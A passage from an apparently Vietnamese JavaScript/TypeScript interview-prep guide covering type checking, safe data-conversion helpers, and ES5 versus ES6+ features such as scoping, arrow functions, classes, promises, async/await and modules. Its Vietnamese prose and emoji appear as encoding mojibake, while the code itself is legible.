â”‚ Array.isArray()            â”‚ âš¡âš¡âš¡âš¡âš¡ â”‚ â­â­â­â­â­  â”‚ N/A          â”‚ âœ… (array)   â”‚
â”‚ Object.prototype.toString  â”‚ âš¡âš¡âš¡âš¡   â”‚ â­â­â­â­â­  â”‚ âœ…           â”‚ âœ…           â”‚
â”‚ Number.isNaN()             â”‚ âš¡âš¡âš¡âš¡âš¡ â”‚ â­â­â­â­â­  â”‚ âœ… (NaN)     â”‚ N/A          â”‚
â”‚ Custom type guards         â”‚ âš¡âš¡âš¡    â”‚ â­â­â­â­â­  â”‚ âœ…           â”‚ âœ…           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Tá»•ng Káº¿t:**

- **typeof**: Nhanh nhÆ°ng cÃ³ bug (null, array)
- **instanceof**: Tá»‘t cho objects, khÃ´ng work vá»›i primitives
- **Array.isArray()**: Tá»‘t nháº¥t cho array
- **Number.isNaN()**: Tá»‘t nháº¥t cho NaN (khÃ´ng coerce)
- **Object.prototype.toString.call()**: ChÃ­nh xÃ¡c nháº¥t cho má»i type
- **Custom type guards**: Tá»‘t nháº¥t cho TypeScript type narrowing

---

**ğŸ›¡ï¸ BONUS: Safe Type Conversion Helpers**

Khi lÃ m viá»‡c vá»›i data tá»« API/user input, cáº§n convert vÃ  validate data an toÃ n:

```typescript
// 1. Safe Number - Convert sá»‘ an toÃ n
function safeNumber(value: any, defaultValue: number = 0): number {
  if (typeof value === 'number' && !isNaN(value) && isFinite(value)) return value;
  if (typeof value === 'string') {
    const parsed = Number(value.trim());
    if (!isNaN(parsed) && isFinite(parsed)) return parsed;
  }
  return defaultValue;
}

// Usage: safeNumber('123') â†’ 123, safeNumber('abc') â†’ 0

// 2. Safe String - Convert string an toÃ n
function safeString(value: any, defaultValue: string = ''): string {
  if (value == null) return defaultValue;
  if (typeof value === 'string') return value.trim();
  return String(value);
}

// Usage: safeString(null) â†’ '', safeString(123) â†’ '123'

// 3. Safe Boolean - Parse boolean tá»« nhiá»u format
function safeBoolean(value: any, defaultValue: boolean = false): boolean {
  if (value == null) return defaultValue;
  if (typeof value === 'boolean') return value;
  if (typeof value === 'number') return value === 1;
  if (typeof value === 'string') {
    const lower = value.toLowerCase().trim();
    if (['true', '1', 'yes', 'on'].includes(lower)) return true;
    if (['false', '0', 'no', 'off', ''].includes(lower)) return false;
  }
  return defaultValue;
}

// Usage: safeBoolean('yes') â†’ true, safeBoolean('no') â†’ false

// 4. Safe Array - Convert thÃ nh array
function safeArray<T>(value: any, defaultValue: T[] = []): T[] {
  if (Array.isArray(value)) return value;
  if (value == null) return defaultValue;
  if (value instanceof Set || value instanceof Map) return Array.from(value);
  if (typeof value === 'string') return value.split(',').map(s => s.trim()) as T[];
  return [value];
}

// Usage: safeArray('a,b,c') â†’ ['a','b','c'], safeArray(null) â†’ []

// 5. Safe Object - Convert thÃ nh object
function safeObject<T = any>(value: any, defaultValue: T = {} as T): T {
  if (value == null) return defaultValue;
  if (typeof value === 'object' && !Array.isArray(value)) return value;
  if (typeof value === 'string') {
    try { return JSON.parse(value); } catch { return defaultValue; }
  }
  return defaultValue;
}

// Usage: safeObject('{"a":1}') â†’ {a:1}, safeObject(null) â†’ {}

// Universal Safe Parser
const safe = {
  number: safeNumber,
  string: safeString,
  boolean: safeBoolean,
  array: safeArray,
  object: safeObject,
};

// Practical: Parse API Response
interface UserAPI { id: any; name: any; age: any; isActive: any; }
interface User { id: number; name: string; age: number; isActive: boolean; }

function parseUser(api: UserAPI): User {
  return {
    id: safe.number(api.id, 0),
    name: safe.string(api.name, 'Unknown'),
    age: safe.number(api.age, 0),
    isActive: safe.boolean(api.isActive, false),
  };
}
```

**Use Cases:** Parse API responses, validate user input, convert data formats, safe defaults
---
</details>

## **Pháº§n 2: ES5 vs ES6+ Features**


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">âš¡ Q9: ES5 vs ES6+ Features - So SÃ¡nh Chi Tiáº¿t & CÃ¡ch Hoáº¡t Äá»™ng</span></summary>


**âš¡ Quick Summary:**
> ES6+ = let/const, arrow functions, classes, destructuring, promises, modules. ES5 = var, function, callbacks

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ”¥ **ES6 Key Features**: let/const, =>, class, {...spread}, [destructuring], `template`, Promise, import/export
- ğŸ“¦ **Block Scope**: let/const cÃ³ block scope, var cÃ³ function scope
- âš¡ **Arrow Function**: KhÃ´ng cÃ³ `this` riÃªng, khÃ´ng cÃ³ `arguments`, khÃ´ng dÃ¹ng lÃ m constructor
- ğŸ¯ **Classes**: Syntactic sugar cho prototype-based inheritance

**Tráº£ lá»i:**

- **ES5 (ECMAScript 5, 2009)**: JavaScript cÆ¡ báº£n vá»›i function declarations, var, prototype-based inheritance, callbacks
- **ES6/ES2015+ (2015-now)**: Modern JavaScript vá»›i classes, modules, arrow functions, destructuring, promises, async/await
- **ğŸ”¥ Æ¯u Ä‘iá»ƒm ES6+**: Code ngáº¯n gá»n hÆ¡n 30-50%, type-safe hÆ¡n vá»›i const/let, performance tá»‘t hÆ¡n vá»›i optimizations, syntax hiá»‡n Ä‘áº¡i dá»… Ä‘á»c
- **âš ï¸ NhÆ°á»£c Ä‘iá»ƒm ES6+**: Cáº§n transpilation (Babel) cho IE11 vÃ  older browsers, learning curve cao hÆ¡n, bundle size cÃ³ thá»ƒ lá»›n hÆ¡n

**ğŸ¯ Timeline & Browser Support:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    JAVASCRIPT EVOLUTION TIMELINE                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚  ğŸ“… ES5 (2009) - Stable, Universal Support                              â”‚
â”‚     âœ… All browsers (IE9+)                                              â”‚
â”‚     âœ… No transpilation needed                                          â”‚
â”‚     âŒ Verbose syntax, limited features                                 â”‚
â”‚                                                                          â”‚
â”‚  ğŸ“… ES6/ES2015 (2015) - Major Update                                    â”‚
â”‚     â€¢ Classes, Modules, Arrow Functions                                 â”‚
â”‚     â€¢ let/const, Template Literals                                      â”‚
â”‚     â€¢ Destructuring, Spread/Rest                                        â”‚
â”‚     â€¢ Promises, Symbols, Iterators                                      â”‚
â”‚     âœ… Modern browsers (Chrome 51+, Firefox 54+, Safari 10+)           â”‚
â”‚     âš ï¸  Needs Babel for IE11                                            â”‚
â”‚                                                                          â”‚
â”‚  ğŸ“… ES2016-ES2023 (Yearly Updates)                                      â”‚
â”‚     â€¢ Async/Await (ES2017)                                              â”‚
â”‚     â€¢ Optional Chaining ?. (ES2020)                                     â”‚
â”‚     â€¢ Nullish Coalescing ?? (ES2020)                                    â”‚
â”‚     â€¢ BigInt, Dynamic Import                                            â”‚
â”‚     â€¢ Private Fields, Top-level await                                   â”‚
â”‚     âœ… Evergreen browsers auto-update                                   â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Code Example - Comprehensive Comparison:**

```typescript
// ============================================
// 1. VARIABLES - var vs let/const
// ============================================

// ğŸ”´ ES5 - var (Function Scoped, Hoisted)
// CÃ¡ch hoáº¡t Ä‘á»™ng: var Ä‘Æ°á»£c hoist lÃªn Ä‘áº§u function scope
function es5Variables() {
  console.log(x); // undefined (hoisted nhÆ°ng chÆ°a gÃ¡n giÃ¡ trá»‹)
  var x = 10; // Function scoped - accessible trong toÃ n bá»™ function

  if (true) {
    var x = 20; // CÃ™NG biáº¿n x (khÃ´ng táº¡o scope má»›i)
  }

  console.log(x); // 20 (bá»‹ ghi Ä‘Ã¨ bá»Ÿi if block)

  // var cÃ³ thá»ƒ redeclare
  var x = 30; // âœ… OK - khÃ´ng error
  console.log(x); // 30
}

// ğŸŸ¢ ES6+ - let/const (Block Scoped, Temporal Dead Zone)
// CÃ¡ch hoáº¡t Ä‘á»™ng: let/const chá»‰ tá»“n táº¡i trong {} block, cÃ³ TDZ
function es6Variables() {
  // console.log(y); // âŒ ReferenceError: Cannot access before initialization
  // Temporal Dead Zone (TDZ) - tá»« Ä‘áº§u block Ä‘áº¿n khi declare

  let y = 10; // Block scoped - chá»‰ trong function nÃ y
  const z = 100; // Immutable reference - khÃ´ng thá»ƒ reassign

  if (true) {
    let y = 20; // BIáº¾N Má»šI - scope riÃªng trong if block
    const z = 200; // BIáº¾N Má»šI - scope riÃªng

    console.log(y); // 20 (biáº¿n local cá»§a if)
    console.log(z); // 200
  }

  console.log(y); // 10 (biáº¿n cá»§a function scope, khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng)
  console.log(z); // 100

  // let y = 30;  // âŒ SyntaxError: Identifier 'y' has already been declared
  // z = 300;     // âŒ TypeError: Assignment to constant variable

  // const cho objects - reference immutable, nhÆ°ng properties mutable
  const obj = { name: 'John' };
  obj.name = 'Jane'; // âœ… OK - thay Ä‘á»•i property
  // obj = {};      // âŒ Error - khÃ´ng thá»ƒ reassign reference
}

// Hoisting Comparison (CÃ¡ch hoáº¡t Ä‘á»™ng cá»§a hoisting)
console.log('=== VAR HOISTING ===');
console.log(varVariable); // undefined - hoisted, chÆ°a assigned
var varVariable = 'ES5';

console.log('=== LET/CONST HOISTING ===');
// console.log(letVariable); // âŒ ReferenceError - TDZ
let letVariable = 'ES6';
// const constVariable; // âŒ SyntaxError - const pháº£i init ngay

// ============================================
// 2. FUNCTIONS - Regular vs Arrow
// ============================================

// ğŸ”´ ES5 - Regular Functions (cÃ³ own this binding)
// CÃ¡ch hoáº¡t Ä‘á»™ng: this binding dynamic, phá»¥ thuá»™c vÃ o cÃ¡ch gá»i
var Calculator = {
  value: 0,

  // Method vá»›i regular function
  add: function (num) {
    this.value += num; // this = Calculator object
    return this.value;
  },

  // Callback problem
  delayedAdd: function (num) {
    setTimeout(function () {
      // this á»Ÿ Ä‘Ã¢y = window (hoáº·c undefined trong strict mode)
      // KhÃ´ng pháº£i Calculator object!
      console.log(this); // window/undefined
      // this.value += num; // âŒ Error hoáº·c NaN
    }, 1000);
  },

  // ES5 solution: bind hoáº·c that = this
  delayedAddFixed: function (num) {
    var that = this; // LÆ°u reference
    setTimeout(function () {
      that.value += num; // âœ… Hoáº¡t Ä‘á»™ng
    }, 1000);
  },

  // Hoáº·c dÃ¹ng bind
  delayedAddBind: function (num) {
    setTimeout(
      function () {
        this.value += num; // âœ… Hoáº¡t Ä‘á»™ng vÃ¬ Ä‘Ã£ bind
      }.bind(this),
      1000
    );
  },
};

// ğŸŸ¢ ES6+ - Arrow Functions (lexical this binding)
// CÃ¡ch hoáº¡t Ä‘á»™ng: Arrow function KHÃ”NG cÃ³ own this, inherit tá»« parent scope
const ModernCalculator = {
  value: 0,

  // Method shorthand syntax
  add(num: number) {
    this.value += num;
    return this.value;
  },

  // Arrow function trong callback - this tá»± Ä‘á»™ng Ä‘Ãºng
  delayedAdd(num: number) {
    setTimeout(() => {
      // this = ModernCalculator (inherit tá»« delayedAdd method)
      this.value += num; // âœ… Hoáº¡t Ä‘á»™ng perfect
    }, 1000);
  },

  // Arrow function khÃ´ng thá»ƒ dÃ¹ng lÃ m constructor
  // MyClass: () => { } // âŒ KhÃ´ng cÃ³ prototype, khÃ´ng thá»ƒ new
};

// Arrow function syntax variations
const simple = (x: number) => x * 2; // Implicit return (1 expression)
const withBlock = (x: number) => {
  const result = x * 2;
  return result; // Explicit return (multiple statements)
};
const noParams = () => console.log('Hello'); // No parameters
const oneParam = (x) => x * 2; // Single param - cÃ³ thá»ƒ bá» ()
const multiParams = (x: number, y: number) => x + y; // Multiple params - cáº§n ()
const returnObject = () => ({ name: 'John' }); // Return object - cáº§n wrap ()

// ============================================
// 3. CLASSES - Prototype vs Class Syntax
// ============================================

// ğŸ”´ ES5 - Prototype-based Inheritance
// CÃ¡ch hoáº¡t Ä‘á»™ng: Constructor function + prototype chain
function Animal(name) {
  // Constructor function (pháº£i gá»i vá»›i new)
  this.name = name; // Instance property
}

// Methods trÃªn prototype (share giá»¯a instances)
Animal.prototype.speak = function () {
  console.log(this.name + ' makes a sound');
};

// Static methods
Animal.createAnimal = function (name) {
  return new Animal(name);
};

// Inheritance qua prototype chain
function Dog(name, breed) {
  Animal.call(this, name); // Gá»i parent constructor
  this.breed = breed;
}

// Set up prototype chain (inheritance)
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog; // Fix constructor reference

// Override method
Dog.prototype.speak = function () {
  console.log(this.name + ' barks!');
};

const dog = new Dog('Rex', 'Labrador');
dog.speak(); // "Rex barks!"

// ğŸŸ¢ ES6+ - Class Syntax (Syntactic Sugar)
// CÃ¡ch hoáº¡t Ä‘á»™ng: BÃªn trong váº«n lÃ  prototype, nhÆ°ng syntax dá»… Ä‘á»c hÆ¡n
class ModernAnimal {
  // Class fields (ES2022)
  species = 'Unknown'; // Public field

  // Constructor
  constructor(public name: string) {
    // Parameter properties (TypeScript)
    // Tá»± Ä‘á»™ng táº¡o this.name = name
  }

  // Instance method (trÃªn prototype)
  speak() {
    console.log(`${this.name} makes a sound`);
  }

  // Static method (trÃªn class itself)
  static createAnimal(name: string) {
    return new ModernAnimal(name);
  }

  // Getter
  get info() {
    return `Animal: ${this.name}`;
  }

  // Setter
  set info(value: string) {
    this.name = value.replace('Animal: ', '');
  }
}

// Inheritance vá»›i extends
class ModernDog extends ModernAnimal {
  constructor(name: string, public breed: string) {
    super(name); // Gá»i parent constructor - Báº®T BUá»˜C
    // Pháº£i call super() trÆ°á»›c khi dÃ¹ng this
  }

  // Override method
  speak() {
    console.log(`${this.name} barks!`);
  }

  // Call parent method
  speakLikeParent() {
    super.speak(); // Gá»i Animal.speak()
  }

  // Private fields (ES2022)
  #privateField = 'secret'; // Chá»‰ accessible trong class

  getPrivate() {
    return this.#privateField; // âœ… OK
  }
}

const modernDog = new ModernDog('Rex', 'Labrador');
modernDog.speak(); // "Rex barks!"
// console.log(modernDog.#privateField); // âŒ SyntaxError: Private field

// ============================================
// 4. TEMPLATE LITERALS vs String Concatenation
// ============================================

// ğŸ”´ ES5 - String Concatenation (verbose, error-prone)
var name = 'John';
var age = 25;
var city = 'Ha Noi';

// Single line
var message = 'Hello ' + name + ', you are ' + age + ' years old';

// Multi-line (pháº£i dÃ¹ng \n vÃ  +)
var multiLine =
  'Name: ' +
  name +
  '\n' +
  'Age: ' +
  age +
  '\n' +
  'City: ' +
  city;

// HTML generation (nightmare)
var html =
  '<div class="user">' +
  '<h2>' +
  name +
  '</h2>' +
  '<p>Age: ' +
  age +
  '</p>' +
  '<p>City: ' +
  city +
  '</p>' +
  '</div>';

// ğŸŸ¢ ES6+ - Template Literals (clean, readable)
// CÃ¡ch hoáº¡t Ä‘á»™ng: Backticks `` cho phÃ©p embedded expressions ${} vÃ  multi-line
const modernMessage = `Hello ${name}, you are ${age} years old`;

// Multi-line (tá»± nhiÃªn, giá»¯ nguyÃªn indentation)
const modernMultiLine = `
  Name: ${name}
  Age: ${age}
  City: ${city}
`;

// Expression trong template (khÃ´ng chá»‰ variables)
const calculation = `2 + 2 = ${2 + 2}`; // "2 + 2 = 4"
const conditional = `Status: ${age >= 18 ? 'Adult' : 'Minor'}`; // Ternary
const methodCall = `Upper: ${name.toUpperCase()}`; // Method call

// HTML generation (dá»… Ä‘á»c hÆ¡n nhiá»u)
const modernHtml = `
  <div class="user">
    <h2>${name}</h2>
    <p>Age: ${age}</p>
    <p>City: ${city}</p>
  </div>
`;

// Tagged Templates (advanced feature)
function highlight(strings: TemplateStringsArray, ...values: any[]) {
  return strings.reduce((result, str, i) => {
    return result + str + (values[i] ? `<mark>${values[i]}</mark>` : '');
  }, '');
}

const highlighted = highlight`Hello ${name}, you are ${age} years old`;
// "Hello <mark>John</mark>, you are <mark>25</mark> years old"

// ============================================
// 5. DESTRUCTURING - Elegant Data Extraction
// ============================================

const user = {
  name: 'John Doe',
  age: 30,
  address: {
    city: 'Ha Noi',
    country: 'Vietnam',
  },
  hobbies: ['coding', 'reading'],
};

// ğŸ”´ ES5 - Manual Assignment (verbose, repetitive)
var userName = user.name;
var userAge = user.age;
var userCity = user.address.city;
var userCountry = user.address.country;
var firstHobby = user.hobbies[0];
var secondHobby = user.hobbies[1];

// ğŸŸ¢ ES6+ - Destructuring (concise, readable)
// Object destructuring
const { name: userName2, age: userAge2 } = user; // Rename variables

// Nested destructuring
const {
  address: { city, country },
} = user;

// Array destructuring
const [firstHobby2, secondHobby2] = user.hobbies;

// Default values
const { email = 'no-email@example.com' } = user; // email khÃ´ng tá»“n táº¡i â†’ dÃ¹ng default

// Rest properties (láº¥y pháº§n cÃ²n láº¡i)
const { name: n, ...rest } = user; // rest = { age, address, hobbies }

// Function parameter destructuring
function greetUser({ name, age }: { name: string; age: number }) {
  console.log(`Hello ${name}, ${age} years old`);
}

greetUser(user); // Truyá»n object, tá»± Ä‘á»™ng destructure

// Array destructuring vá»›i skip
const numbers = [1, 2, 3, 4, 5];
const [first, , third] = numbers; // Skip second element

// Swap variables (elegant)
let a = 1,
  b = 2;
[a, b] = [b, a]; // a=2, b=1 (khÃ´ng cáº§n temp variable)

// ============================================
// 6. SPREAD & REST OPERATORS
// ============================================

// ğŸ”´ ES5 - Array/Object Operations (cumbersome)
var arr1 = [1, 2, 3];
var arr2 = [4, 5, 6];

// Concatenate arrays
var combined = arr1.concat(arr2); // [1,2,3,4,5,6]

// Copy array
var copy = arr1.slice(); // [1,2,3]

// Copy object
var obj1 = { a: 1, b: 2 };
var obj2 = Object.assign({}, obj1); // { a: 1, b: 2 }

// Function vá»›i variable arguments
function sum() {
  var args = Array.prototype.slice.call(arguments); // Convert arguments to array
  return args.reduce(function (total, num) {
    return total + num;
  }, 0);
}

// ğŸŸ¢ ES6+ - Spread & Rest (intuitive, powerful)
// CÃ¡ch hoáº¡t Ä‘á»™ng: ... operator "spreads" iterable elements

// Spread arrays (phÃ¢n rÃ£ array thÃ nh individual elements)
const spreadArr1 = [1, 2, 3];
const spreadArr2 = [4, 5, 6];
const spreadCombined = [...spreadArr1, ...spreadArr2]; // [1,2,3,4,5,6]

// Copy array (shallow)
const spreadCopy = [...spreadArr1]; // [1,2,3]

// Add elements
const withExtra = [...spreadArr1, 4, 5]; // [1,2,3,4,5]
const atBeginning = [0, ...spreadArr1]; // [0,1,2,3]

// Spread objects (phÃ¢n rÃ£ object properties)
const spreadObj1 = { a: 1, b: 2 };
const spreadObj2 = { c: 3, d: 4 };
const spreadObjCombined = { ...spreadObj1, ...spreadObj2 }; // {a:1, b:2, c:3, d:4}

// Override properties
const overridden = { ...spreadObj1, b: 99 }; // {a:1, b:99} - b bá»‹ ghi Ä‘Ã¨

// Spread trong function calls
const maxNum = Math.max(...spreadArr1); // Math.max(1, 2, 3) = 3

// Rest parameters (thu tháº­p remaining arguments vÃ o array)
function modernSum(...numbers: number[]) {
  // numbers lÃ  array [1,2,3,...]
  return numbers.reduce((total, num) => total + num, 0);
}

modernSum(1, 2, 3, 4, 5); // 15

// Rest in destructuring
const [head, ...tail] = [1, 2, 3, 4]; // head=1, tail=[2,3,4]
const { x, ...others } = { x: 1, y: 2, z: 3 }; // x=1, others={y:2, z:3}

// ============================================
// 7. DEFAULT PARAMETERS
// ============================================

// ğŸ”´ ES5 - Manual Default Values
function greetES5(name, greeting) {
  // Check vÃ  assign default
  name = name || 'Guest'; // âš ï¸ Falsy values (0, '', false) cÅ©ng bá»‹ replace
  greeting = typeof greeting !== 'undefined' ? greeting : 'Hello';

  return greeting + ' ' + name;
}

// ğŸŸ¢ ES6+ - Native Default Parameters
// CÃ¡ch hoáº¡t Ä‘á»™ng: Default chá»‰ apply khi argument lÃ  undefined
function greetES6(name = 'Guest', greeting = 'Hello') {
  return `${greeting} ${name}`;
}

greetES6(); // "Hello Guest"
greetES6('John'); // "Hello John"
greetES6('John', 'Hi'); // "Hi John"
greetES6(undefined, 'Hey'); // "Hey Guest" - name dÃ¹ng default

// Default vá»›i expressions
function createUser(name = 'User', id = generateId()) {
  // generateId() chá»‰ cháº¡y khi id undefined
  return { name, id };
}

// Default destructured parameters
function configAPI({
  url = 'https://api.example.com',
  timeout = 5000,
  retries = 3,
} = {}) {
  // = {} Ä‘á»ƒ trÃ¡nh error khi khÃ´ng truyá»n argument
  console.log({ url, timeout, retries });
}

// ============================================
// 8. PROMISES vs CALLBACKS
// ============================================

// ğŸ”´ ES5 - Callback Hell (pyramid of doom)
function fetchUserES5(userId, callback) {
  setTimeout(function () {
    // Simulate API call
    var user = { id: userId, name: 'John' };

    // Nested callbacks
    fetchPostsES5(userId, function (posts) {
      fetchCommentsES5(posts[0].id, function (comments) {
        fetchLikesES5(comments[0].id, function (likes) {
          // ğŸ˜± Callback hell - hard to read, maintain, error handle
          callback({ user, posts, comments, likes });
        });
      });
    });
  }, 100);
}

// Error handling vá»›i callbacks (phá»©c táº¡p)
function fetchDataES5(callback) {
  setTimeout(function () {
    var error = Math.random() > 0.5 ? new Error('Failed') : null;
    var data = error ? null : { value: 42 };
    callback(error, data); // Node.js style: error-first callback
  }, 100);
}

// ğŸŸ¢ ES6+ - Promises (chainable, readable)
// CÃ¡ch hoáº¡t Ä‘á»™ng: Promise lÃ  object Ä‘áº¡i diá»‡n cho eventual completion/failure
function fetchUserES6(userId: string): Promise<any> {
  return new Promise((resolve, reject) => {
    // executor function cháº¡y immediately
    setTimeout(() => {
      const user = { id: userId, name: 'John' };
      resolve(user); // Success
      // reject(new Error('Failed')); // Failure
    }, 100);
  });
}

// Promise chaining (flat, readable)
fetchUserES6('123')
  .then((user) => {
    console.log('User:', user);
    return fetchPosts(user.id); // Return promise â†’ chain tiáº¿p
  })
  .then((posts) => {
    console.log('Posts:', posts);
    return fetchComments(posts[0].id);
  })
  .then((comments) => {
    console.log('Comments:', comments);
    return fetchLikes(comments[0].id);
  })
  .then((likes) => {
    console.log('Likes:', likes);
  })
  .catch((error) => {
    // Single catch cho táº¥t cáº£ errors
    console.error('Error:', error);
  })
  .finally(() => {
    // Cháº¡y dÃ¹ thÃ nh cÃ´ng hay fail
    console.log('Cleanup');
  });

// Promise combinators
const promise1 = fetchUserES6('1');
const promise2 = fetchUserES6('2');
const promise3 = fetchUserES6('3');

// Promise.all - chá» táº¥t cáº£ resolve (hoáº·c 1 reject)
Promise.all([promise1, promise2, promise3]).then((results) => {
  console.log('All users:', results); // [user1, user2, user3]
});

// Promise.race - láº¥y káº¿t quáº£ cá»§a promise nhanh nháº¥t
Promise.race([promise1, promise2, promise3]).then((result) => {
  console.log('First user:', result); // user nÃ o resolve trÆ°á»›c
});

// Promise.allSettled - chá» táº¥t cáº£ settle (resolve hoáº·c reject)
Promise.allSettled([promise1, promise2, promise3]).then((results) => {
  results.forEach((result) => {
    if (result.status === 'fulfilled') {
      console.log('Success:', result.value);
    } else {
      console.log('Failed:', result.reason);
    }
  });
});

// Promise.any - láº¥y promise fulfilled Ä‘áº§u tiÃªn
Promise.any([promise1, promise2, promise3]).then((result) => {
  console.log('First successful:', result);
});

// ============================================
// 9. ASYNC/AWAIT - Promise Syntax Sugar
// ============================================

// ğŸŸ¢ ES2017 - Async/Await (looks synchronous, actually async)
// CÃ¡ch hoáº¡t Ä‘á»™ng: async function tá»± Ä‘á»™ng return Promise, await pause execution
async function fetchAllData() {
  try {
    // await "pauses" execution until promise resolves
    const user = await fetchUserES6('123'); // Looks synchronous!
    console.log('User:', user);

    const posts = await fetchPosts(user.id); // Wait for user first
    console.log('Posts:', posts);

    const comments = await fetchComments(posts[0].id);
    console.log('Comments:', comments);

    const likes = await fetchLikes(comments[0].id);
    console.log('Likes:', likes);

    return { user, posts, comments, likes };
  } catch (error) {
    // Try-catch cho error handling (nhÆ° synchronous code)
    console.error('Error:', error);
    throw error; // Re-throw náº¿u cáº§n
  } finally {
    console.log('Cleanup');
  }
}

// Parallel execution vá»›i Promise.all
async function fetchMultipleUsers() {
  // âŒ Sequential (slow) - má»—i request Ä‘á»£i previous
  const user1 = await fetchUserES6('1'); // Wait 100ms
  const user2 = await fetchUserES6('2'); // Wait thÃªm 100ms
  const user3 = await fetchUserES6('3'); // Wait thÃªm 100ms
  // Total: 300ms

  // âœ… Parallel (fast) - táº¥t cáº£ requests cÃ¹ng lÃºc
  const [user1, user2, user3] = await Promise.all([
    fetchUserES6('1'),
    fetchUserES6('2'),
    fetchUserES6('3'),
  ]);
  // Total: 100ms (chá»‰ chá» slowest request)
}

// Top-level await (ES2022) - await ngoÃ i async function
// const config = await fetch('/api/config').then(r => r.json());
// console.log(config); // âœ… OK trong module scope

// ============================================
// 10. MODULES - Import/Export
// ============================================

// ğŸ”´ ES5 - No Native Modules
// Pháº£i dÃ¹ng patterns nhÆ° IIFE, CommonJS (Node.js), AMD (RequireJS)

// IIFE Pattern (Immediately Invoked Function Expression)
var MyModule = (function () {
  var privateVar = 'secret';

  function privateMethod() {
    console.log(privateVar);
  }

  return {
    publicMethod: function () {
      privateMethod();
    },
  };
})();

// CommonJS (Node.js)
// module.exports = { name: 'John', greet: function() {} };
// const user = require('./user');

// ğŸŸ¢ ES6+ - Native Modules (static analysis, tree-shaking)
// CÃ¡ch hoáº¡t Ä‘á»™ng: Import/export statements, module scope riÃªng biá»‡t

// Named exports (cÃ³ thá»ƒ nhiá»u per file)
export const PI = 3.14159;
export function calculateArea(radius: number) {
  return PI * radius * radius;
}
export class Circle {
  constructor(public radius: number) {}
}

// Default export (chá»‰ 1 per file)
export default class User {
  constructor(public name: string) {}
}

// Import named exports
import { PI, calculateArea, Circle } from './math';

// Import default export
import User from './user';

// Import both
import User, { PI, calculateArea } from './combined';

// Rename imports
import { PI as PIValue } from './math';

// Import all
import * as MathUtils from './math';
MathUtils.PI; // 3.14159
MathUtils.calculateArea(5);

// Re-export (module aggregation)
export { PI, calculateArea } from './math';
export { default as User } from './user';

// Dynamic imports (code splitting)
const module = await import('./heavy-module'); // Lazy load
module.doSomething();

// Conditional imports
if (condition) {
  const { feature } = await import('./feature');
  feature();
}
```

**ğŸ¯ Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… Always use const/let** thay vÃ¬ var - block scoping an toÃ n hÆ¡n
2. **âœ… Prefer arrow functions** cho callbacks vÃ  short functions
3. **âœ… Use template literals** cho string manipulation
4. **âœ… Destructure objects/arrays** Ä‘á»ƒ code ngáº¯n gá»n
5. **âœ… Use spread operator** cho cloning vÃ  merging
6. **âœ… Prefer async/await** over promise chains - dá»… Ä‘á»c hÆ¡n
7. **âœ… Use ES6 modules** thay vÃ¬ CommonJS trong modern projects
8. **âœ… Use default parameters** thay vÃ¬ manual checks
9. **âœ… Use class syntax** cho OOP - cleaner than prototypes
10. **âœ… Enable Babel** hoáº·c TypeScript cho transpilation vÃ  type safety

**âŒ Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: DÃ¹ng var trong modern code
var name = 'John'; // âŒ Function scoped, cÃ³ thá»ƒ gÃ¢y bugs

// âœ… ÄÃšNG: DÃ¹ng const/let
const name = 'John'; // âœ… Block scoped, immutable
let age = 25; // âœ… Block scoped, mutable

// âŒ Lá»–I 2: Arrow function lÃ m method (lose this binding)
const obj = {
  value: 42,
  getValue: () => this.value, // âŒ this = window, khÃ´ng pháº£i obj
};

// âœ… ÄÃšNG: Regular function cho methods
const obj = {
  value: 42,
  getValue() {
    return this.value; // âœ… this = obj
  },
};

// âŒ Lá»–I 3: QuÃªn await trong async function
async function fetchData() {
  const data = fetchUserES6('123'); // âŒ data lÃ  Promise, khÃ´ng pháº£i value
  console.log(data.name); // undefined
}

// âœ… ÄÃšNG: Await promise
async function fetchData() {
  const data = await fetchUserES6('123'); // âœ… Chá» promise resolve
  console.log(data.name); // "John"
}

// âŒ Lá»–I 4: Sequential await khi cÃ³ thá»ƒ parallel
async function slow() {
  const user1 = await fetchUser('1'); // 100ms
  const user2 = await fetchUser('2'); // 100ms
  const user3 = await fetchUser('3'); // 100ms
  // Total: 300ms
}

// âœ… ÄÃšNG: Parallel vá»›i Promise.all
async function fast() {
  const [user1, user2, user3] = await Promise.all([
    fetchUser('1'),
    fetchUser('2'),
    fetchUser('3'),
  ]);
  // Total: 100ms
}

